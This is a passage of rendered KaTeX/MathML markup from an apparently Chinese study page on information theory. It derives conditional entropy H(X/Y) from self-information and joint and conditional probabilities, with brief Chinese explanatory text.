style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">]</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><h2 id="信源熵">信源熵</h2><p>如果同时考虑两个信源，要计算<strong>条件熵</strong>，可以根据数学期望的定义，得到：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mrow><mo fence="true">[</mo><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">]</mo></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi></mrow><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">H(X/Y)=E\left[ I\left( a_i/b_j \right) \right] =\sum_{j=1}^m{\sum_{i=1}^n{p}}\left( a_ib_j \right) I\left( a_i/b_j \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">]</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.0652em;vertical-align:-1.4138em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>这里必须注意，出现 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(a_i/b_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 的概率是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">b_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 同时发生。也可以用如下的办法推理，一次只考虑一个随机变量：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>∵</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*}&amp;\because H\left( X/b_j \right) =\sum_{i=1}^n{p}\left( a_i/b_j \right) I\left( a_i/b_j \right) =-\sum_{i=1}^n{p}\left( a_i/b_j \right) \log p\left( a_i/b_j \right)\\&amp;H(X/Y)=\sum_{j=1}^m{p}\left( b_j \right) H\left( X/b_j \right) \\&amp;=-\sum_{j=1}^m{\sum_{i=1}^n{p\left( b_j \right) p\left( a_i/b_j \right) \log p\left( a_i/b_j \right)}}\\&amp;=-\sum_{j=1}^m{\sum_{i=1}^n{p\left( a_ib_j \right) \log p\left( a_i/b_j \right)}}\\\end{align*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:13.3246em;vertical-align:-6.4123em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.9123em;"><span style="top:-8.9123em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span><span style="top:-5.6832em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span><span style="top:-2.3181em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span><span style="top:1.0471em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.4123em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.9123em;"><span style="top:-8.9123em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">∵</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-5.6832em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span 